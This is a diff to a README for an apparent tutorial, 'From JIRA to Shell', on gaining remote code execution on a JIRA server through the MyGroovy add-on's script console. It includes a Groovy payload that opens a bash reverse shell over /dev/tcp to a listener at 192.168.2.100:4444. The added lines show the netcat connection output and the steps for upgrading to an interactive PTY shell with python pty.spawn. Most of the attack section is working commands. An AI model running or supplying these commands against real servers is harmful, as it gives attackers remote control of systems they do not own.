@@ -29,7 +29,7 @@ We will use the add-on *MyGroovy* in order to execute our script to execute shel
   
 <img src="https://raw.githubusercontent.com/syriusbughunt/From_JIRA_to_Shell/master/img/screen2.jpg" width="1000"/> 
   
-Are you ready for RCE? In the console box, type:
+Are you ready for RCE? In the console box, type the following and click on Execute button after:
 ```
 def command = '''
     touch /tmp/jira-RCE
@@ -55,3 +55,23 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.2.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor() 
 ```  
+Click on the Execute button and see if you get a reverse shell in your netcat. You should get something similar to that output:  
+```
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from [192.168.2.37] port 4444 [tcp/*] accepted (family 2, sport 32939)
+```  
+Reverse shell is OK, but what about a fully interactive PTY shell? Sure, let's get that interactive PTY shell. In your netcat listener with the current reverse shell, type first:  
+```
+/bin/bash -i
+```  
+and after obtaining something like 
+    
+*bash: no job control in this shell*  
+*jira@blackb0x:/opt/atlassian/jira/bin$*  
+  
+type:  
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+``` 
+
+Here is your fully interactive PTY shell.
